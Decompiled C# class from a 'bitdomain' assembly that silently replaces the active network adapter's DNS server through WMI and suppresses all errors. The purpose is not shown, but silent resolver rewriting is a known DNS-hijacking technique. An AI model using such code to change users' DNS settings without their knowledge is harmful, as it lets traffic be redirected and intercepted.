using System;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;

namespace bitdomain
{
	// Token: 0x02000012 RID: 18
	internal class dnschange
	{
		// Token: 0x06000030 RID: 48 RVA: 0x00005118 File Offset: 0x00003318
		public static void dns(string DnsString)
		{
			try
			{
				string[] value = new string[]
				{
					DnsString
				};
				NetworkInterface activeEthernetOrWifiNetworkInterface = dnschange.GetActiveEthernetOrWifiNetworkInterface();
				bool flag = activeEthernetOrWifiNetworkInterface == null;
				if (!flag)
				{
					ManagementClass managementClass = new ManagementClass("Win32_NetworkAdapterConfiguration");
					ManagementObjectCollection instances = managementClass.GetInstances();
					foreach (ManagementBaseObject managementBaseObject in instances)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						bool flag2 = (bool)managementObject["IPEnabled"];
						if (flag2)
						{
							bool flag3 = managementObject["Caption"].ToString().Contains(activeEthernetOrWifiNetworkInterface.Description);
							if (flag3)
							{
								ManagementBaseObject methodParameters = managementObject.GetMethodParameters("SetDNSServerSearchOrder");
								bool flag4 = methodParameters != null;
								if (flag4)
								{
									methodParameters["DNSServerSearchOrder"] = value;
									managementObject.InvokeMethod("SetDNSServerSearchOrder", methodParameters, null);
								}
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000031 RID: 49 RVA: 0x0000522C File Offset: 0x0000342C
		public static NetworkInterface GetActiveEthernetOrWifiNetworkInterface()
		{
			NetworkInterface result;
			try
			{
				NetworkInterface networkInterface = NetworkInterface.GetAllNetworkInterfaces().FirstOrDefault(delegate(NetworkInterface a)
				{
					bool result2;
					if (a.OperationalStatus == OperationalStatus.Up && (a.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 || a.NetworkInterfaceType == NetworkInterfaceType.Ethernet))
					{
						result2 = a.GetIPProperties().GatewayAddresses.Any((GatewayIPAddressInformation g) => g.Address.AddressFamily.ToString() == "InterNetwork");
					}
					else
					{
						result2 = false;
					}
					return result2;
				});
				result = networkInterface;
			}
			catch
			{
				result = null;
			}
			return result;
		}
	}
}
